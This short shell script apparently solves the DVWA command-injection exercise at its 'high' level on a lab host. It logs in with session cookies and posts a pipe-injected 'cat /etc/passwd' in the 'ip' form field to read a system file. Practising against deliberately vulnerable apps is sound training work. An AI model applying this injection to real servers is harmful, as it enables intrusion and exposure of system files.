#Login with found details
source ../levelled_login.sh high
#Check out the "Command Injection" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/exec/"> /dev/null
#Get the server to 'cat /etc/passwd'
curl -s -i -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/exec/" -d "ip=%7Ccat+%2Fetc%2Fpasswd&Submit=Submit" > result
unset LEVEL
unset SESSIONID
